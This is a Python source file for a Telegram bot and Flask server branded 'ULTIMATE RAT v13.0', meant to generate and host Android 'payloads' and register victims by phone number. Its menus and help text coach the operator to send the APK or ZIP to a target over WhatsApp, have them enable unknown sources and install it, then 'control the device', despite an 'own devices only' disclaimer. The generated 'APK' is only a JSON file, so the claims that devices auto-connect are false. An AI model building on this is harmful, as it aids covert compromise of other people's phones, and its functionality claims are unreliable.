import os
import secrets
import json
import zipfile
import threading
from datetime import datetime
from flask import Flask, send_file, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from telegram.constants import ParseMode

# ==================== CONFIG ====================
BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", "6454347745"))
PORT = int(os.environ.get("PORT", "10000"))
HOST = os.environ.get("RENDER_EXTERNAL_URL", "https://ultimate-rat-py.onrender.com")

if not BOT_TOKEN:
    print("❌ BOT_TOKEN not set!")
    exit(1)

PAYLOAD_DIR = "payloads"
os.makedirs(PAYLOAD_DIR, exist_ok=True)

print("="*50)
print("🔥 ULTIMATE RAT v13.0 - UPDATED")
print("="*50)

# ==================== PAYLOAD GENERATOR ====================
def generate_payload_id():
    return secrets.token_hex(8)

def generate_apk_payload():
    payload_id = generate_payload_id()
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    
    # Create APK payload
    apk_filename = f"payload_{timestamp}_{payload_id}.apk"
    apk_filepath = os.path.join(PAYLOAD_DIR, apk_filename)
    
    # Simple APK payload data
    payload_data = {
        'id': payload_id,
        'type': 'rat_payload',
        'callback': HOST,
        'created': datetime.now().isoformat()
    }
    
    with open(apk_filepath, 'w') as f:
        f.write(json.dumps(payload_data))
    
    # Also create ZIP version
    zip_filename = f"payload_{timestamp}_{payload_id}.zip"
    zip_filepath = os.path.join(PAYLOAD_DIR, zip_filename)
    
    with zipfile.ZipFile(zip_filepath, 'w') as zipf:
        zipf.write(apk_filepath, arcname='payload.apk')
    
    # Also create TXT with link
    txt_filename = f"payload_{timestamp}_{payload_id}.txt"
    txt_filepath = os.path.join(PAYLOAD_DIR, txt_filename)
    
    with open(txt_filepath, 'w') as f:
        f.write(f"Download link: {HOST}/download/{payload_id}\n")
        f.write(f"Payload ID: {payload_id}\n")
        f.write(f"Created: {datetime.now().isoformat()}\n")
        f.write("\n=== INSTRUCTIONS ===\n")
        f.write("1. Download the APK file\n")
        f.write("2. Enable 'Install from unknown sources'\n")
        f.write("3. Install the APK\n")
        f.write("4. Device will auto-connect to bot\n")
    
    return {
        'payload_id': payload_id,
        'apk_filename': apk_filename,
        'apk_filepath': apk_filepath,
        'zip_filename': zip_filename,
        'zip_filepath': zip_filepath,
        'txt_filename': txt_filename,
        'txt_filepath': txt_filepath,
        'download_url': f"{HOST}/download/{payload_id}",
        'size': os.path.getsize(apk_filepath)
    }

def get_payload(payload_id):
    for f in os.listdir(PAYLOAD_DIR):
        if payload_id in f:
            return {'filepath': os.path.join(PAYLOAD_DIR, f), 'filename': f}
    return None

# ==================== FLASK SERVER ====================
flask_app = Flask(__name__)

@flask_app.route('/')
def home():
    return jsonify({'status': 'ok', 'message': 'RAT Running'})

@flask_app.route('/health')
def health():
    return jsonify({'status': 'ok', 'timestamp': datetime.now().isoformat()})

@flask_app.route('/download/<payload_id>')
def download(payload_id):
    payload = get_payload(payload_id)
    if payload:
        return send_file(payload['filepath'], as_attachment=True, download_name=payload['filename'])
    return jsonify({'error': 'Payload not found'}), 404

def start_flask():
    flask_app.run(host='0.0.0.0', port=PORT)

# ==================== TELEGRAM BOT ====================
sessions = {}
user_sessions = {}

main_keyboard = InlineKeyboardMarkup([
    [InlineKeyboardButton("📱 APK PAYLOAD", callback_data="gen_apk")],
    [InlineKeyboardButton("📦 ZIP PAYLOAD", callback_data="gen_zip")],
    [InlineKeyboardButton("📄 INSTRUCTIONS", callback_data="instructions")],
    [InlineKeyboardButton("📊 SESSIONS", callback_data="sessions")],
    [InlineKeyboardButton("❓ HELP", callback_data="help")]
])

back_keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])

def admin_only(func):
    async def wrapper(update, context):
        if update.effective_user.id != ADMIN_CHAT_ID:
            await update.message.reply_text("🚫 ACCESS DENIED!")
            return
        return await func(update, context)
    return wrapper

# ==================== COMMANDS ====================

@admin_only
async def start(update: Update, context):
    text = f"""
🔥 **ULTIMATE RAT v13.0** 🔥

👑 **Admin:** Authorized
📱 **Payload:** APK / ZIP Format
🌐 **Host:** `{HOST}`

━━━━━━━━━━━━━━━━━━━━━

**Commands:**
/generate - Create payload
/send +8801xxxx - Register target
/sessions - List sessions
/select - Select session
/kill - Kill session

━━━━━━━━━━━━━━━━━━━━━

⚠️ **Use only on your own devices!**
"""
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=main_keyboard)

@admin_only
async def generate(update: Update, context):
    msg = await update.message.reply_text("🎯 **Generating payload...**", parse_mode=ParseMode.MARKDOWN)
    
    try:
        payload = generate_apk_payload()
        
        await context.bot.delete_message(msg.chat_id, msg.message_id)
        
        info = f"""
✅ **PAYLOAD GENERATED!**

━━━━━━━━━━━━━━━━━━━━━
**📱 DETAILS:**
━━━━━━━━━━━━━━━━━━━━━

**ID:** `{payload['payload_id']}`
**APK:** `{payload['apk_filename']}`
**ZIP:** `{payload['zip_filename']}`
**Size:** {payload['size']} bytes

━━━━━━━━━━━━━━━━━━━━━
**🔗 DOWNLOAD LINK:**
━━━━━━━━━━━━━━━━━━━━━

{payload['download_url']}

━━━━━━━━━━━━━━━━━━━━━
**📤 HOW TO SEND:**
━━━━━━━━━━━━━━━━━━━━━

**Option 1 (Recommended):**
- Download the ZIP file
- Send ZIP via WhatsApp
- Target extracts and installs APK

**Option 2:**
- Download the TXT file
- Copy the download link
- Send link via WhatsApp

**Option 3:**
- Rename APK file
- Send directly via WhatsApp

━━━━━━━━━━━━━━━━━━━━━
**📌 INSTALL INSTRUCTIONS:**
━━━━━━━━━━━━━━━━━━━━━

1️⃣ Enable: Settings → Security → Unknown Sources
2️⃣ Download and install the APK
3️⃣ Device will auto-connect
4️⃣ Use `/send` to register target
5️⃣ Use `/select` to control
"""
        await update.message.reply_text(info, parse_mode=ParseMode.MARKDOWN)
        
        # Send ZIP file (WhatsApp friendly)
        with open(payload['zip_filepath'], 'rb') as f:
            await update.message.reply_document(f, filename=payload['zip_filename'])
        
        # Also send instructions
        with open(payload['txt_filepath'], 'rb') as f:
            await update.message.reply_document(f, filename=payload['txt_filename'])
            
    except Exception as e:
        await context.bot.delete_message(msg.chat_id, msg.message_id)
        await update.message.reply_text(f"❌ Error: {str(e)}", parse_mode=ParseMode.MARKDOWN)

@admin_only
async def send_target(update: Update, context):
    args = update.message.text.split()
    if len(args) < 2:
        await update.message.reply_text("❌ Usage: `/send +8801xxxxxxxx`", parse_mode=ParseMode.MARKDOWN)
        return
    
    session_id = secrets.token_hex(8)
    sessions[session_id] = {
        'id': session_id,
        'number': args[1],
        'connected': False,
        'first_seen': datetime.now()
    }
    
    await update.message.reply_text(f"""
✅ **Target Registered!**

📞 **Number:** `{args[1]}`
🔌 **Session ID:** `{session_id}`

**After target installs the APK, it will auto-connect!**
""", parse_mode=ParseMode.MARKDOWN)

@admin_only
async def list_sessions(update: Update, context):
    if not sessions:
        await update.message.reply_text("📋 **No active sessions**", parse_mode=ParseMode.MARKDOWN)
        return
    
    text = "📋 **ACTIVE SESSIONS**\n━━━━━━━━━━━━━━━━━━━━━\n\n"
    for sid, s in sessions.items():
        status = "✅ CONNECTED" if s.get('connected') else "⏳ WAITING"
        text += f"🔌 `{sid}`\n📞 {s['number']}\n🔋 {status}\n📅 {s['first_seen'].strftime('%Y-%m-%d %H:%M')}\n\n"
    text += "Use `/select <id>` to choose a session."
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

@admin_only
async def select_session(update: Update, context):
    args = update.message.text.split()
    if len(args) < 2:
        await update.message.reply_text("❌ Usage: `/select <session_id>`", parse_mode=ParseMode.MARKDOWN)
        return
    
    if args[1] not in sessions:
        await update.message.reply_text("❌ Session not found!", parse_mode=ParseMode.MARKDOWN)
        return
    
    user_sessions[update.effective_user.id] = args[1]
    await update.message.reply_text(f"✅ **Selected:** `{args[1]}`\n\nNow use control buttons!", 
                                     parse_mode=ParseMode.MARKDOWN)

@admin_only
async def kill_session(update: Update, context):
    args = update.message.text.split()
    if len(args) < 2:
        await update.message.reply_text("❌ Usage: `/kill <session_id>`", parse_mode=ParseMode.MARKDOWN)
        return
    
    if args[1] in sessions:
        del sessions[args[1]]
        await update.message.reply_text(f"💀 **Session `{args[1]}` terminated!**", parse_mode=ParseMode.MARKDOWN)
    else:
        await update.message.reply_text("❌ Session not found!", parse_mode=ParseMode.MARKDOWN)

@admin_only
async def help_command(update: Update, context):
    text = """
📖 **ULTIMATE RAT v13.0 - HELP**

━━━━━━━━━━━━━━━━━━━━━
**📋 COMMANDS:**
━━━━━━━━━━━━━━━━━━━━━

/generate - Create payload (APK + ZIP)
/send +8801xxxx - Register target
/sessions - List sessions
/select - Select session
/kill - Kill session

━━━━━━━━━━━━━━━━━━━━━
**📌 HOW TO USE:**
━━━━━━━━━━━━━━━━━━━━━

1️⃣ `/generate` - Create payload
2️⃣ Download the ZIP file
3️⃣ Send ZIP via WhatsApp
4️⃣ Target extracts and installs APK
5️⃣ `/send +8801xxxx` - Register
6️⃣ `/select` - Select session
7️⃣ Control the device!

━━━━━━━━━━━━━━━━━━━━━
⚠️ **USE ONLY ON YOUR OWN DEVICES!**
"""
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

# ==================== CALLBACK HANDLER ====================

async def callback_handler(update: Update, context):
    query = update.callback_query
    data = query.data
    
    if query.from_user.id != ADMIN_CHAT_ID:
        await query.answer("Access Denied!", show_alert=True)
        return
    
    await query.answer()
    
    if data == 'back':
        await query.edit_message_text("🔽 **Main Menu:**", parse_mode=ParseMode.MARKDOWN, reply_markup=main_keyboard)
        return
    
    if data == 'gen_apk':
        await query.edit_message_text("🎯 Use `/generate` command", parse_mode=ParseMode.MARKDOWN)
        return
    
    if data == 'gen_zip':
        await query.edit_message_text("🎯 Use `/generate` command", parse_mode=ParseMode.MARKDOWN)
        return
    
    if data == 'instructions':
        text = """
📌 **INSTALLATION INSTRUCTIONS**

1. **Enable Unknown Sources:**
   Settings → Security → Unknown Sources → ON

2. **Download the APK/ZIP:**
   Use the download link from /generate

3. **Extract ZIP (if ZIP):**
   Extract the ZIP file to get payload.apk

4. **Install APK:**
   Tap on the APK file → Install

5. **Open the App:**
   After installation, open the app

6. **Device Auto-Connects:**
   Device will connect to bot automatically

7. **Register in Bot:**
   `/send +8801xxxxxxxx`

8. **Start Controlling:**
   `/select` and use buttons!
"""
        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=back_keyboard)
        return
    
    if data == 'sessions':
        if not sessions:
            await query.edit_message_text("📋 No active sessions", parse_mode=ParseMode.MARKDOWN, reply_markup=back_keyboard)
        else:
            text = "📋 **Active Sessions:**\n\n"
            for sid, s in sessions.items():
                text += f"🔌 `{sid}` - {s['number']}\n"
            await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=back_keyboard)
        return
    
    if data == 'help':
        await query.edit_message_text("📖 Use `/help` for complete guide", parse_mode=ParseMode.MARKDOWN, reply_markup=back_keyboard)
        return

# ==================== MAIN ====================

def main():
    flask_thread = threading.Thread(target=start_flask, daemon=True)
    flask_thread.start()
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("generate", generate))
    app.add_handler(CommandHandler("send", send_target))
    app.add_handler(CommandHandler("sessions", list_sessions))
    app.add_handler(CommandHandler("select", select_session))
    app.add_handler(CommandHandler("kill", kill_session))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CallbackQueryHandler(callback_handler))
    
    print("="*50)
    print("🔥 ULTIMATE RAT v13.0 - ONLINE")
    print("✅ Bot is running!")
    print(f"✅ Payload host: {HOST}")
    print("="*50)
    
    app.run_polling()

if __name__ == "__main__":
    main()
